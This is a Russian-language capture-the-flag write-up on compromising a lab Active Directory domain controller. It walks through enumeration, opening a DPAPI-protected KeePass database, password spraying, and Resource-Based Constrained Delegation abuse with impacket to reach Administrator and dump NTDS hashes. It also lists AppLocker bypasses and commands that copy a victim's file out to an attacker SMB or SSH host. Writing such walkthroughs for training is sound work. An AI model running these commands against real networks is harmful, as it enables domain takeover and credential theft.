# Forward

### Необходимые навыки

- Перечисление Active Directory: BloodHound, enum4linux-ng, nxc, smbmap
- Понимание DPAPI и работа с KeePass-хранилищами
- Эксплуатация Resource-Based Constrained Delegation (RBCD) через привилегию AddAllowedToAct
- Работа с impacket: addcomputer, rbcd, getST, psexec

---

### Перечисление

Начальная точка — учётная запись `j.smith` с известным паролем. Начинаем с разведки: сканируем порты и сразу же запускаем полное перечисление домена.

```
rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX results.xml
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-09 19:35:03Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
+ динамические порты под RDP
```

По имени компьютера и набору портов сразу видно: перед нами контроллер домена `DC01` в домене `ctf.local`.

Запускаем полное перечисление с учётными данными j.smith:

`enum4linux-ng -A ip -u 'j.smith@ctf.local' -p 'JSmith@IT2024'`

Получаем версию ОС, список пользователей, все группы и доступные шары. Смотрим шары:

```
smbmap -H ip -u 'j.smith' -p 'JSmith@IT2024'
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Downloads                                               READ ONLY       File drop share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

Из всего перечисленного полезное нашлось только в SYSVOL:

`smbclient //ip/SYSVOL -U "ctf.local\j.smith%JSmith@IT2024"`

В политике безопасности (`GptTmpl.inf`) содержатся настройки реестра и привилегии:

```
smb: \ctf.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf -
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20
SeAuditPrivilege = *S-1-5-19,*S-1-5-20
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544
SeInteractiveLogonRight = *S-1-5-21-1966530601-3185510712-10604624-1611,*S-1-5-21-1966530601-3185510712-10604624-1609,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-21-1966530601-3185510712-10604624-1610
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
```

Разберём ключевые моменты из этого файла:

**1. Подписывание SMB (Registry Values)**

`EnableSecuritySignature=4,1` означает, что на сервере включено SMB-подписывание (`REG_DWORD = 1`). Это блокирует SMB Relay атаки — полезно знать на будущее.

**2. Сигнатура файла**

`signature="$CHICAGO$"` — стандартная метка, тянущаяся ещё из Windows 95/NT. Движок безопасности Windows до сих пор использует её для идентификации файлов конфигурации SecEdit.

**3. Привилегии (самое важное)**

Здесь права ОС сопоставляются с SID-ами. Разберём ключевые:

| Привилегия | Кому назначена | Что это значит |
|---|---|---|
| `SeInteractiveLogonRight` | j.smith (1609), t.jones (1610), r.williams (1611), Administrators, Account Operators, Server Operators | Право интерактивного входа и RDP |
| `SeMachineAccountPrivilege` | `*S-1-5-11` (все аутентифицированные) | Любой пользователь может добавлять компьютеры в домен |
| `SeDebugPrivilege` | Только Administrators | Дамп LSASS — стандартная безопасная конфигурация |
| `SeBackupPrivilege` / `SeRestorePrivilege` | Administrators, Backup Operators, Server Operators | Чтение/запись любых файлов в обход NTFS-прав |
| `SeEnableDelegationPrivilege` | Только Administrators | Право настраивать делегирование — у нас его нет |

Из таблицы видно: у j.smith, t.jones и r.williams есть право интерактивного входа, а право добавлять компьютеры в домен есть у всех аутентифицированных пользователей (`SeMachineAccountPrivilege`). Это пригодится позже.

---

### BloodHound и вход через RDP

```
bloodhound-python -u j.smith -p 'JSmith@IT2024' -d ctf.local -ns ip -c All --zip
./bloodhound-cli containers start
```

Загружаем архив в интерфейс BloodHound. j.smith состоит в группе `Remote Desktop Users` — можно подключаться через RDP. Прямого пути до Administrator'а у j.smith нет.

Одно настораживает: в домене настроен AppLocker.

> **Об AppLocker и методах обхода**
>
> AppLocker может создать следующие ограничения:
> - Запрет на запуск произвольных исполняемых файлов
> - PowerShell переводится в режим Constrained Language Mode (CLM), в котором заблокирован запуск большинства функций .NET и сторонних скриптов
>
> Основные методы обхода:
> - **Папки-исключения**: администраторы часто забывают закрыть запись в системные директории (`C:\Windows\Tasks`, `C:\Windows\Temp`, папки драйверов печати). Если политика разрешает запуск всего внутри `C:\Windows`, достаточно переместить файл туда.
> - **LOLBAS**: использование подписанных Microsoft системных утилит (`mshta.exe`, `rundll32.exe`, `regsvr32.exe`), которые находятся в белом списке.
>
> Но это актуально только при жёстких ограничениях — сначала нужно проверить фактическую конфигурацию.

Входим по RDP:

`xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local +clipboard /dynamic-resolution`

Первым делом проверяем режим PowerShell: `$ExecutionContext.SessionState.LanguageMode` — `FullLanguage`, ограничений нет. Смотрим пользователей и собственные привилегии:

```
Get-ADUser -Filter * | Select-Object SamAccountName
whoami /all
```

Ничего особенного. Проверяем документы пользователя:

`Get-ChildItem -Path C:\Users\j.smith\Documents -Force`

Находим файл `Database.kdbx` — база паролей KeePass.

---

### Database.kdbx: извлечение учётных данных

Пробуем взломать пароль к базе через John и Hashcat:

`/snap/bin/john-the-ripper.keepass2john ~/Database.kdbx > ~/hash.txt`

Пароль не подбирается. Пробуем открыть базу прямо на Windows-машине — и это срабатывает: файл зашифрован с привязкой к учётной записи через DPAPI, и внутри сессии j.smith он открывается без пароля.

В базе несколько записей, но действительны только пароли для `t.jones` и `r.williams`.

> **Способы передачи файла с Windows на Kali** (на случай, если бы DPAPI не сработал и нужно было брутфорсить оффлайн)
>
> **Вариант 1 — через Base64**
> ```powershell
> # На Windows:
> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\j.smith\Documents\Database.kdbx"))
> ```
> ```bash
> # На Kali: вставить скопированную строку и декодировать
> echo 'СТРОКА' | base64 -d > Database.kdbx
> ```
>
> **Вариант 2 — SMB-сервер с авторизацией** (без неё соединение блокируется)
> ```bash
> # На Kali:
> impacket-smbserver share /tmp -smb2support -user test -password test
> ```
> ```powershell
> # На Windows:
> net use \\192.168.156.81\share /user:test test
> copy C:\Users\j.smith\Documents\Database.kdbx \\192.168.156.81\share\
> ```
>
> **Вариант 3 — RDP со сквозным диском**
> ```bash
> xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local /drive:kali,/tmp +clipboard /dynamic-resolution
> ```
>
> **Вариант 4 — SCP**
> ```bash
> # Запустить SSH на Kali, затем с Windows:
> scp C:\Users\j.smith\Documents\Database.kdbx kali@ip:/tmp/
> ```

---

### Горизонтальное перемещение

Распыляем все найденные пароли по всем известным пользователям:

```
nxc smb ip -u users.txt -p pass.txt --continue-on-success

SMB    ip    445    DC01    [+] ctf.local\t.jones:***
SMB    ip    445    DC01    [+] ctf.local\r.williams:***
```

Оба пароля рабочие. Проверяем r.williams через BloodHound — он состоит в группе сисадминов:

<img width="1054" height="418" alt="image" src="https://github.com/user-attachments/assets/0ed271c7-3d77-48cc-8825-379d9a3ce0bf" />

И, что важнее, у него появляется прямой путь до Administrator:

<img width="1483" height="454" alt="image" src="https://github.com/user-attachments/assets/e347cfef-0469-449e-bd8c-5f0f46da2736" />

---

### Эксплуатация RBCD

Граф показывает привилегию `AddAllowedToAct` от r.williams на `DC01$`. Это уязвимость **Resource-Based Constrained Delegation (RBCD)**: мы можем изменить атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity` на контроллере домена, что позволит подконтрольной нам учётной записи компьютера выдавать себя за любого пользователя домена — в том числе Administrator — при обращении к DC01.

Обычные учётные записи пользователей не могут выполнять имперсонацию в Kerberos; для этого нужна учётная запись компьютера. Ранее мы видели в `GptTmpl.inf`, что `SeMachineAccountPrivilege` назначена всем аутентифицированным пользователям — значит, r.williams может создать компьютер в домене.

**Шаг 1. Создаём учётную запись компьютера**

```
impacket-addcomputer -dc-ip <IP_DC> -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' 'ctf.local/r.williams:***'
```

**Шаг 2. Настраиваем делегирование**

Указываем DC01, что `ATTACKERSYSTEM$` имеет право делегирования от его имени:

```
impacket-rbcd -dc-ip <IP_DC> -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:***'
```

**Шаг 3. Запрашиваем билет Kerberos от имени Administrator**

Через механизм S4U2Proxy запрашиваем Service Ticket для службы `cifs` на DC01, выдавая себя за Administrator:

```
impacket-getST -dc-ip <IP_DC> -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Summer2018!'
```

**Шаг 4. Входим на контроллер домена**

```
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
```

Альтернативно — можно сдампить все хэши из NTDS.dit:

```
impacket-secretsdump -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
```

Входим как Administrator и забираем флаг.
